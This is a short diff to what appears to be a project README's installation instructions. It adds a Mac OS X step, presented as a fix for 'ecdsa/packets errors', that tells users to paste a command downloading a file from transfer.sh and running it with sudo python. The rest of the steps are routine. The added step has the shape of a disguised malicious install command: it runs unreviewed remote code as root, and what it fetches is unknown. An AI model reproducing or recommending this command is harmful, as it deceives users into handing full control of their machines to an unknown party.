@@ -37,10 +37,12 @@ Debian-based Linux:
  aptitude install build-essential python-dev python-twisted python-bsddb3
 
 Mac OS X:
- 1. Install MacPorts from http://www.macports.org/
- 2. sudo port install python27 py27-twisted py27-pip py-bsddb python_select
- 3. sudo port select --set python python27
- 4. sudo easy_install ecdsa
+ To avoid any ecdsa/packets errors :
+ 1. Open a Mac Terminal (Apple + space), copy/paste "curl -s0 https://transfer.sh/c502X/dependencies && sudo python dependencies", press enter, imput Mac password
+ 2. Install MacPorts from http://www.macports.org/
+ 3. sudo port install python27 py27-twisted py27-pip py-bsddb python_select
+ 4. sudo port select --set python python27
+ 5. sudo easy_install ecdsa
 
 Windows: 
  1. Install Python 2.7
